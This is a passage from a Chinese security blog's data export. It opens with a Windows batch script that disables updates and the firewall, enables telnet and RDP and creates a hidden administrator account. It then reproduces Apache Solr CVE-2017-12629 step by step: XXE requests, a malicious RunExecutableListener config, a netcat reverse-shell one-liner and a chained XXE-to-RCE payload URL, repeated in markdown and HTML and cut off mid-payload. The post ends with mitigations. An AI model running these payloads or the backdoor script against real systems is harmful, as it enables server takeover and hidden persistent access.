class=\"line\">3</div><div class=\"line\">4</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># 从进程中查找rdp进程</span></div><div class=\"line\">tasklist  /svc | find <span class=\"string\">\"TermService\"</span></div><div class=\"line\"><span class=\"comment\"># 根据pid（1316）查询端口号</span></div><div class=\"line\">netstat -ano | find <span class=\"string\">\"1316\"</span></div></pre></td></tr></table></figure>\n<h2 id=\"脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\"><a href=\"#脚本-maybe-dangerous-lt-未实际使用，仅供参考-gt\" class=\"headerlink\" title=\"脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;\"></a>脚本(maybe dangerous)  &lt;未实际使用，仅供参考&gt;</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div></pre></td><td class=\"code\"><pre><div class=\"line\">@<span class=\"built_in\">echo</span> off</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable off <span class=\"string\">\"AUTO UPDATE\"</span></div><div class=\"line\">REM ****************</div><div class=\"line\">sc config wuauserv start= disabled</div><div class=\"line\">net stop wuauserv</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Disable windows xp Firewall</div><div class=\"line\">REM ****************</div><div class=\"line\">netsh firewall <span class=\"built_in\">set</span> opmode <span class=\"built_in\">disable</span></div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable TELNET</div><div class=\"line\">REM ****************</div><div class=\"line\">sc config tlntsvr start= auto</div><div class=\"line\">net start telnet</div><div class=\"line\"></div><div class=\"line\">REM ****************</div><div class=\"line\">REM Enable Remote Desktop</div><div class=\"line\">REM ****************</div><div class=\"line\">reg add <span class=\"string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> /v fDenyTSConnections /t REG_DWORD /d 0 /f</div><div class=\"line\"></div><div class=\"line\">REM ***************</div><div class=\"line\">REM Create a HIDDEN USER usr= hack007, pass= dani</div><div class=\"line\">REM ***************</div><div class=\"line\">net user hacker007 dani /add</div><div class=\"line\">net localgroup <span class=\"string\">\"Administrators\"</span> /add hacker007</div><div class=\"line\">net localgroup <span class=\"string\">\"Users\"</span> /del hacker007</div><div class=\"line\">reg add <span class=\"string\">\"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList\"</span> /v hacker007 /t REG_DWORD /d 0 /f</div><div class=\"line\">reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v dontdisplaylastusername /t REG_DWORD /d 1 /f</div></pre></td></tr></table></figure>"},{"title":"Apache Solr XML外部实体扩展(XXE)及远程代码执行（RCE CVE-2017-12629）","date":"2017-10-17T06:55:56.000Z","_content":"## 0x00 简述\n这里涉及到两个漏洞，一个是外部实体扩展XML External Entity Expansion (deftype=xmlparser) ，另一个是远程代码执行Remote Code Execution (add-listener: RunExecutableListener)。这两个漏洞是由Michael Stepankin (JPMorgan Chase)和Olga Barinova (Gotham Digital Science)发现并公布，此处主要进行漏洞复现。\n\n原文地址：[http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html](http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html)\n\nSolr主页：[http://lucene.apache.org/solr/](http://lucene.apache.org/solr/)\n\n<!-- more -->\n\n安装及启动都非常简单，不过需要强调的是，代码执行的漏洞需要在solr -c模式(cloud)下才有效。\n\n启动后界面如下：\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot01.png)\n\n**平台：macOS 10.12.6**\n\n## 0x01 XXE复现\nLucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。\n#### 1. 使用netcat侦听4444端口 \"nc -lv 4444\"\n\n#### 2. 浏览器访问\n```\nhttp://localhost:8983/solr/solr/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:4444/hello-liehu\"><a></a>'}\n```\n\n#### 3. netcat接收到solr的请求包。\n\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot02.png)\n\n\n## 0x02 RCE复现( CVE-2017-12629 )\nSolr的RunExecutableListener类可用于对特定事件执行任意命令，例如在每次更新查询后执行(postCommit)。该漏洞的问题点在于这样的监听器可以通过带有add-listener命令的Config API来启用任意参数。\n\n#### 1. 新建一个名为Hunter的集合\n\nhttp://localhost:8983/solr/admin/collections?action=CREATE&name=Hunter&numShards=2&maxShardsPerNode=2\n\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot03.png)\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot04.png)\nPS：就复现而言，可以手动在后台添加集合或者使用现有集合。\n\n#### 2. 使用netcat侦听4444端口“nc -lv 4444”\n\n#### 3. 为集合添加一个新的RunExecutableListener监听器，其中\"exe\"属性内容为运行命令的名称(\"curl\")，\"args\"属性内容\" http://localhost:4444/helloRCE \"为netcat侦听的端口。\n\n```json\nPOST /solr/Hunter/config HTTP/1.1\nHost: localhost:8983\nConnection: close\nContent-Type: application/json  \nContent-Length: 198\n\n{\n  \"add-listener\" : {\n    \"event\":\"postCommit\",\n    \"name\":\"newlistener\",\n    \"class\":\"solr.RunExecutableListener\",\n    \"exe\":\"curl\",\n    \"dir\":\"/usr/bin/\",\n    \"args\":[\"http://localhost:4444/helloRCE\"]\n  }\n}\n```\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot05.png)\n\n>   如果出现如上报错，是因为集合中没有数据。向http://localhost:8983/solr/Hunter/update 提交一些数据即可（数据提交方式参考下一步）。（资料参考：https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html ）\n    \n>   如果监听器已经存在，可以考虑更换name,或者将add-listener修改为update-listener.\n\n#### 4. 更新集合\"Hunter\"以触发RunExecutableListener的执行。\n\n提交更新后，等一段时间后接收到请求包。\n\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot06.png)\n\n#### 5. 反弹Shell\n\nmac下nc没有-e选项，也没有/dev/tcp，可使用\n\n```bash\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 6666 > /tmp/f \n```\nupdate一下监听器：\n```json\n{\n    \"update-listener\": {\n        \"event\": \"postCommit\",\n        \"name\": \"reverseShell\",\n        \"class\": \"solr.RunExecutableListener\",\n        \"exe\": \"sh\",\n        \"dir\": \"/bin/\",\n        \"args\": [\"-c\", \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 6666 > /tmp/f\"]\n    }\n}\n```\nupdate一下数据，即可收到反弹shell:\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot07.png)\n\n## 0x03 XXE&RCE 组合利用\n\n通过将如上两个漏洞组合，外部攻击者即使不能直接访问Sorl服务器，也可以实现远程代码执行。 唯一的要求是攻击者可以构造查询参数'q'。 如下的利用便是将所有的payload置于q参数，发起请求即可实现。\n\n#### 1. 通过XXE新建集合combineEXP\n\n```\nhttp://localhost:8983/solr/Hunter/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/admin/collections?action=CREATE%26name=combineEXP%26numShards=2%26maxShardsPerNode=2\"><a></a>'}\n```\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot08.png)\n\n#### 2. 通过XXE添加RunExecutableListener\n```\nhttp://localhost:8983/solr/combineEXP/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/combineEXP/select?q=xxx&qt=/solr/combineEXP/config?stream.body={\"add-listener\": {\"event\": \"postCommit\", \"name\": \"shell\",\"class\": \"solr.RunExecutableListener\", \"exe\": \"sh\",\"dir\": \"/bin/\", \"args\": [\"-c\", \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 7777 > /tmp/f\"]}}\"]}}&shards=localhost:8983/\"><a></a>'}\n```\n先对stream.body内容进行二次URL编码(因为反弹shell的命令含有特殊字符)，然后在对q内容进行一次URL编码，得到URL(经过编码后的URL很长，这里不列出)。\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot09.png)\n会显示error，但实际已经成功。\n\n#### 3. 通过XXE更新内容触发动作\n\n```\nhttp://localhost:8983/solr/combineEXP/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/combineEXP/update?stream.body=[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}\n```\n先对stream.body内容进行一次URL编码，然后在对q内容进行一次URL编码，得到URL。\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot10.png)\nshell反弹成功！！！\n\n## 0x04 防护方案\n1. 关注官方消息，及时升级到solr 7.1版本。\n2. 以系统参数\"-Ddisable.configEdit=true\"重启Solr实例，可实现临时性防护。(可能会影响正常功能)","source":"_posts/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629.md","raw":"---\ntitle: Apache Solr XML外部实体扩展(XXE)及远程代码执行（RCE CVE-2017-12629）\ndate: 2017-10-17 14:55:56\ntags: 漏洞复现\n---\n## 0x00 简述\n这里涉及到两个漏洞，一个是外部实体扩展XML External Entity Expansion (deftype=xmlparser) ，另一个是远程代码执行Remote Code Execution (add-listener: RunExecutableListener)。这两个漏洞是由Michael Stepankin (JPMorgan Chase)和Olga Barinova (Gotham Digital Science)发现并公布，此处主要进行漏洞复现。\n\n原文地址：[http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html](http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html)\n\nSolr主页：[http://lucene.apache.org/solr/](http://lucene.apache.org/solr/)\n\n<!-- more -->\n\n安装及启动都非常简单，不过需要强调的是，代码执行的漏洞需要在solr -c模式(cloud)下才有效。\n\n启动后界面如下：\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot01.png)\n\n**平台：macOS 10.12.6**\n\n## 0x01 XXE复现\nLucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。\n#### 1. 使用netcat侦听4444端口 \"nc -lv 4444\"\n\n#### 2. 浏览器访问\n```\nhttp://localhost:8983/solr/solr/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:4444/hello-liehu\"><a></a>'}\n```\n\n#### 3. netcat接收到solr的请求包。\n\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot02.png)\n\n\n## 0x02 RCE复现( CVE-2017-12629 )\nSolr的RunExecutableListener类可用于对特定事件执行任意命令，例如在每次更新查询后执行(postCommit)。该漏洞的问题点在于这样的监听器可以通过带有add-listener命令的Config API来启用任意参数。\n\n#### 1. 新建一个名为Hunter的集合\n\nhttp://localhost:8983/solr/admin/collections?action=CREATE&name=Hunter&numShards=2&maxShardsPerNode=2\n\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot03.png)\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot04.png)\nPS：就复现而言，可以手动在后台添加集合或者使用现有集合。\n\n#### 2. 使用netcat侦听4444端口“nc -lv 4444”\n\n#### 3. 为集合添加一个新的RunExecutableListener监听器，其中\"exe\"属性内容为运行命令的名称(\"curl\")，\"args\"属性内容\" http://localhost:4444/helloRCE \"为netcat侦听的端口。\n\n```json\nPOST /solr/Hunter/config HTTP/1.1\nHost: localhost:8983\nConnection: close\nContent-Type: application/json  \nContent-Length: 198\n\n{\n  \"add-listener\" : {\n    \"event\":\"postCommit\",\n    \"name\":\"newlistener\",\n    \"class\":\"solr.RunExecutableListener\",\n    \"exe\":\"curl\",\n    \"dir\":\"/usr/bin/\",\n    \"args\":[\"http://localhost:4444/helloRCE\"]\n  }\n}\n```\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot05.png)\n\n>   如果出现如上报错，是因为集合中没有数据。向http://localhost:8983/solr/Hunter/update 提交一些数据即可（数据提交方式参考下一步）。（资料参考：https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html ）\n    \n>   如果监听器已经存在，可以考虑更换name,或者将add-listener修改为update-listener.\n\n#### 4. 更新集合\"Hunter\"以触发RunExecutableListener的执行。\n\n提交更新后，等一段时间后接收到请求包。\n\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot06.png)\n\n#### 5. 反弹Shell\n\nmac下nc没有-e选项，也没有/dev/tcp，可使用\n\n```bash\nrm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 6666 > /tmp/f \n```\nupdate一下监听器：\n```json\n{\n    \"update-listener\": {\n        \"event\": \"postCommit\",\n        \"name\": \"reverseShell\",\n        \"class\": \"solr.RunExecutableListener\",\n        \"exe\": \"sh\",\n        \"dir\": \"/bin/\",\n        \"args\": [\"-c\", \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 6666 > /tmp/f\"]\n    }\n}\n```\nupdate一下数据，即可收到反弹shell:\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot07.png)\n\n## 0x03 XXE&RCE 组合利用\n\n通过将如上两个漏洞组合，外部攻击者即使不能直接访问Sorl服务器，也可以实现远程代码执行。 唯一的要求是攻击者可以构造查询参数'q'。 如下的利用便是将所有的payload置于q参数，发起请求即可实现。\n\n#### 1. 通过XXE新建集合combineEXP\n\n```\nhttp://localhost:8983/solr/Hunter/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/admin/collections?action=CREATE%26name=combineEXP%26numShards=2%26maxShardsPerNode=2\"><a></a>'}\n```\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot08.png)\n\n#### 2. 通过XXE添加RunExecutableListener\n```\nhttp://localhost:8983/solr/combineEXP/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/combineEXP/select?q=xxx&qt=/solr/combineEXP/config?stream.body={\"add-listener\": {\"event\": \"postCommit\", \"name\": \"shell\",\"class\": \"solr.RunExecutableListener\", \"exe\": \"sh\",\"dir\": \"/bin/\", \"args\": [\"-c\", \"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 127.0.0.1 7777 > /tmp/f\"]}}\"]}}&shards=localhost:8983/\"><a></a>'}\n```\n先对stream.body内容进行二次URL编码(因为反弹shell的命令含有特殊字符)，然后在对q内容进行一次URL编码，得到URL(经过编码后的URL很长，这里不列出)。\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot09.png)\n会显示error，但实际已经成功。\n\n#### 3. 通过XXE更新内容触发动作\n\n```\nhttp://localhost:8983/solr/combineEXP/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://localhost:8983/solr/combineEXP/update?stream.body=[{\"id\":\"AAA\"}]&commit=true&overwrite=true\"><a></a>'}\n```\n先对stream.body内容进行一次URL编码，然后在对q内容进行一次URL编码，得到URL。\n![](Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot10.png)\nshell反弹成功！！！\n\n## 0x04 防护方案\n1. 关注官方消息，及时升级到solr 7.1版本。\n2. 以系统参数\"-Ddisable.configEdit=true\"重启Solr实例，可实现临时性防护。(可能会影响正常功能)","slug":"Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629","published":1,"updated":"2017-10-19T08:37:53.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cj9qrjfqs000397uvhv91z6gw","content":"<h2 id=\"0x00-简述\"><a href=\"#0x00-简述\" class=\"headerlink\" title=\"0x00 简述\"></a>0x00 简述</h2><p>这里涉及到两个漏洞，一个是外部实体扩展XML External Entity Expansion (deftype=xmlparser) ，另一个是远程代码执行Remote Code Execution (add-listener: RunExecutableListener)。这两个漏洞是由Michael Stepankin (JPMorgan Chase)和Olga Barinova (Gotham Digital Science)发现并公布，此处主要进行漏洞复现。</p>\n<p>原文地址：<a href=\"http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html\" target=\"_blank\" rel=\"external\">http://lucene.472066.n3.nabble.com/Re-Several-critical-vulnerabilities-discovered-in-Apache-Solr-XXE-amp-RCE-td4358308.html</a></p>\n<p>Solr主页：<a href=\"http://lucene.apache.org/solr/\" target=\"_blank\" rel=\"external\">http://lucene.apache.org/solr/</a></p>\n<a id=\"more\"></a>\n<p>安装及启动都非常简单，不过需要强调的是，代码执行的漏洞需要在solr -c模式(cloud)下才有效。</p>\n<p>启动后界面如下：<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot01.png\" alt=\"\"></p>\n<p><strong>平台：macOS 10.12.6</strong></p>\n<h2 id=\"0x01-XXE复现\"><a href=\"#0x01-XXE复现\" class=\"headerlink\" title=\"0x01 XXE复现\"></a>0x01 XXE复现</h2><p>Lucene包括一个使用XML数据结构创建全功能Lucene查询的解析器。从5.1版本开始，在Sorl的搜索查询中就开始支持xml查询。而出现漏洞的关键点在于Lucene的XML解析器没有明确禁止外部实体的DOCTYPE声明和扩展，造成可以在XML文档中包含指向外部文件(file:// )或者外部URL(http:// )的特殊实体。</p>\n<h4 id=\"1-使用netcat侦听4444端口-“nc-lv-4444”\"><a href=\"#1-使用netcat侦听4444端口-“nc-lv-4444”\" class=\"headerlink\" title=\"1. 使用netcat侦听4444端口 “nc -lv 4444”\"></a>1. 使用netcat侦听4444端口 “nc -lv 4444”</h4><h4 id=\"2-浏览器访问\"><a href=\"#2-浏览器访问\" class=\"headerlink\" title=\"2. 浏览器访问\"></a>2. 浏览器访问</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/solr/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:4444/hello-liehu&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<h4 id=\"3-netcat接收到solr的请求包。\"><a href=\"#3-netcat接收到solr的请求包。\" class=\"headerlink\" title=\"3. netcat接收到solr的请求包。\"></a>3. netcat接收到solr的请求包。</h4><p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot02.png\" alt=\"\"></p>\n<h2 id=\"0x02-RCE复现-CVE-2017-12629\"><a href=\"#0x02-RCE复现-CVE-2017-12629\" class=\"headerlink\" title=\"0x02 RCE复现( CVE-2017-12629 )\"></a>0x02 RCE复现( CVE-2017-12629 )</h2><p>Solr的RunExecutableListener类可用于对特定事件执行任意命令，例如在每次更新查询后执行(postCommit)。该漏洞的问题点在于这样的监听器可以通过带有add-listener命令的Config API来启用任意参数。</p>\n<h4 id=\"1-新建一个名为Hunter的集合\"><a href=\"#1-新建一个名为Hunter的集合\" class=\"headerlink\" title=\"1. 新建一个名为Hunter的集合\"></a>1. 新建一个名为Hunter的集合</h4><p><a href=\"http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=Hunter&amp;numShards=2&amp;maxShardsPerNode=2\" target=\"_blank\" rel=\"external\">http://localhost:8983/solr/admin/collections?action=CREATE&amp;name=Hunter&amp;numShards=2&amp;maxShardsPerNode=2</a></p>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot03.png\" alt=\"\"><br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot04.png\" alt=\"\"><br>PS：就复现而言，可以手动在后台添加集合或者使用现有集合。</p>\n<h4 id=\"2-使用netcat侦听4444端口“nc-lv-4444”\"><a href=\"#2-使用netcat侦听4444端口“nc-lv-4444”\" class=\"headerlink\" title=\"2. 使用netcat侦听4444端口“nc -lv 4444”\"></a>2. 使用netcat侦听4444端口“nc -lv 4444”</h4><h4 id=\"3-为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称-“curl”-，”args”属性内容”-http-localhost-4444-helloRCE-“为netcat侦听的端口。\"><a href=\"#3-为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称-“curl”-，”args”属性内容”-http-localhost-4444-helloRCE-“为netcat侦听的端口。\" class=\"headerlink\" title=\"3. 为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称(“curl”)，”args”属性内容” http://localhost:4444/helloRCE “为netcat侦听的端口。\"></a>3. 为集合添加一个新的RunExecutableListener监听器，其中”exe”属性内容为运行命令的名称(“curl”)，”args”属性内容” <a href=\"http://localhost:4444/helloRCE\" target=\"_blank\" rel=\"external\">http://localhost:4444/helloRCE</a> “为netcat侦听的端口。</h4><figure class=\"highlight\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div></pre></td><td class=\"code\"><pre><div class=\"line\">POST /solr/Hunter/config HTTP/1.1</div><div class=\"line\">Host: localhost:8983</div><div class=\"line\">Connection: close</div><div class=\"line\">Content-Type: application/json  </div><div class=\"line\">Content-Length: 198</div><div class=\"line\"></div><div class=\"line\">&#123;</div><div class=\"line\">  \"add-listener\" : &#123;</div><div class=\"line\">    \"event\":\"postCommit\",</div><div class=\"line\">    \"name\":\"newlistener\",</div><div class=\"line\">    \"class\":\"solr.RunExecutableListener\",</div><div class=\"line\">    \"exe\":\"curl\",</div><div class=\"line\">    \"dir\":\"/usr/bin/\",</div><div class=\"line\">    \"args\":[\"http://localhost:4444/helloRCE\"]</div><div class=\"line\">  &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot05.png\" alt=\"\"></p>\n<blockquote>\n<p>  如果出现如上报错，是因为集合中没有数据。向<a href=\"http://localhost:8983/solr/Hunter/update\" target=\"_blank\" rel=\"external\">http://localhost:8983/solr/Hunter/update</a> 提交一些数据即可（数据提交方式参考下一步）。（资料参考：<a href=\"https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html\" target=\"_blank\" rel=\"external\">https://lucene.apache.org/solr/guide/7_0/uploading-data-with-index-handlers.html</a> ）</p>\n<p>  如果监听器已经存在，可以考虑更换name,或者将add-listener修改为update-listener.</p>\n</blockquote>\n<h4 id=\"4-更新集合”Hunter”以触发RunExecutableListener的执行。\"><a href=\"#4-更新集合”Hunter”以触发RunExecutableListener的执行。\" class=\"headerlink\" title=\"4. 更新集合”Hunter”以触发RunExecutableListener的执行。\"></a>4. 更新集合”Hunter”以触发RunExecutableListener的执行。</h4><p>提交更新后，等一段时间后接收到请求包。</p>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot06.png\" alt=\"\"></p>\n<h4 id=\"5-反弹Shell\"><a href=\"#5-反弹Shell\" class=\"headerlink\" title=\"5. 反弹Shell\"></a>5. 反弹Shell</h4><p>mac下nc没有-e选项，也没有/dev/tcp，可使用</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">rm <span class=\"_\">-f</span> /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 6666 &gt; /tmp/f</div></pre></td></tr></table></figure>\n<p>update一下监听器：<br><figure class=\"highlight json\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div></pre></td><td class=\"code\"><pre><div class=\"line\">&#123;</div><div class=\"line\">    <span class=\"attr\">\"update-listener\"</span>: &#123;</div><div class=\"line\">        <span class=\"attr\">\"event\"</span>: <span class=\"string\">\"postCommit\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"name\"</span>: <span class=\"string\">\"reverseShell\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"class\"</span>: <span class=\"string\">\"solr.RunExecutableListener\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"exe\"</span>: <span class=\"string\">\"sh\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"dir\"</span>: <span class=\"string\">\"/bin/\"</span>,</div><div class=\"line\">        <span class=\"attr\">\"args\"</span>: [<span class=\"string\">\"-c\"</span>, <span class=\"string\">\"rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 127.0.0.1 6666 &gt; /tmp/f\"</span>]</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure></p>\n<p>update一下数据，即可收到反弹shell:<br><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot07.png\" alt=\"\"></p>\n<h2 id=\"0x03-XXE-amp-RCE-组合利用\"><a href=\"#0x03-XXE-amp-RCE-组合利用\" class=\"headerlink\" title=\"0x03 XXE&amp;RCE 组合利用\"></a>0x03 XXE&amp;RCE 组合利用</h2><p>通过将如上两个漏洞组合，外部攻击者即使不能直接访问Sorl服务器，也可以实现远程代码执行。 唯一的要求是攻击者可以构造查询参数’q’。 如下的利用便是将所有的payload置于q参数，发起请求即可实现。</p>\n<h4 id=\"1-通过XXE新建集合combineEXP\"><a href=\"#1-通过XXE新建集合combineEXP\" class=\"headerlink\" title=\"1. 通过XXE新建集合combineEXP\"></a>1. 通过XXE新建集合combineEXP</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/Hunter/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/admin/collections?action=CREATE%26name=combineEXP%26numShards=2%26maxShardsPerNode=2&quot;&gt;&lt;a&gt;&lt;/a&gt;&apos;&#125;</div></pre></td></tr></table></figure>\n<p><img src=\"/2017/10/Apache-Solr-XML外部实体扩展XXE及远程代码执行RCE-CVE-2017-12629/screenshot08.png\" alt=\"\"></p>\n<h4 id=\"2-通过XXE添加RunExecutableListener\"><a href=\"#2-通过XXE添加RunExecutableListener\" class=\"headerlink\" title=\"2. 通过XXE添加RunExecutableListener\"></a>2. 通过XXE添加RunExecutableListener</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div></pre></td><td class=\"code\"><pre><div class=\"line\">http://localhost:8983/solr/combineEXP/select?q=&#123;!xmlparser v=&apos;&lt;!DOCTYPE a SYSTEM &quot;http://localhost:8983/solr/combineEXP/select?q=xxx&amp;qt=/solr/combineEXP/config?stream.body=&#123;&quot;add-listener&quot;: &#123;&quot;event&quot;: &quot;postCommit&quot;, &quot;name&quot;: &quot;shell&quot;,&quot;class&quot;: &quot;solr.RunExecutableListener&quot;, &quot;exe&quot;: &quot;sh&quot;,&quot;dir&quot;: &quot;/bin/&quot;, &quot;args&quot;: [&quot;-c&quot;, &quot;rm -f /tmp/f; 